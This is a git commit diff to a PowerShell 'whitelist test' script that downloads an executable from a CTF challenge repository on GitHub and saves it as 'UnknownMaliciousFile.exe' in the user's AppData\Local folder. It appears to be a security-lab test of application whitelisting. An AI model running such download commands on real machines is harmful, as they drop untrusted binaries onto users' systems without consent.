04ce12469ae3ba167c732e9d5c0f6161db4282c0
NotSurprised <roro8016489@gmail.com>
2018-07-31 16:35:17 +0800

    20180731

--- HackTip/WhiteListTestScript.ps1
+++ HackTip/WhiteListTestScript.ps1
@@ -1,9 +1,12 @@
-$url = "https://github.com/NotSurprised/MyCTF-Challenges/raw/master/ForUCCU/Bof/a17c074327645f88d92de82b511882a2935087990ef46063cef7f208c05a861f.exe"
+cd C:\Users\User\AppData\Local
+
+$url = "https://github.com/NotSurprised/MyCTF-Challenges/raw/master/ForUCCU/Bof/a17c074327645f88d92de82b511882a2935087990ef46063cef7f208c05a861f.exe" 
 $output = "UnknownMaliciousFile.exe"
 $start_time = Get-Date
 
-$wc = New-Object System.Net.WebClient
-$wc.DownloadFile($url, $output)
+[ Net.ServicePointManager ]::SecurityProtocol  = [Net.SecurityProtocolType]::Tls12 
+
+wget $url -outfile $output
 
 Write-Output "Time taken: $((Get-Date).Subtract($start_time).Seconds) second(s)"
 
